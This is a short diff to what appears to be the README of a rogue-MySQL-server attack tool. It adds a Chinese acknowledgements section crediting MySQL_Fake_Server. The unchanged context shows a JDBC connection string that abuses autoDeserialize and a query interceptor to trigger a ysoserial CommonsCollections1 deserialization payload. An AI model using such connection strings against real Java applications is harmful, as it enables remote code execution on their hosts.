@@ -34,3 +34,9 @@ jdbc:mysql://127.0.0.1:3306/test?autoDeserialize=true&statementInterceptors=com.
 ```shell
 jdbc:mysql://127.0.0.1:3306/test?autoDeserialize=true&queryInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor&user=yso_CommonsCollections1_calc.exe
 ```
+
+## 致谢
+
+感谢以下项目，带来的启发
+
+- [!MySQL_Fake_Server](https://github.com/fnmsd/MySQL_Fake_Server)
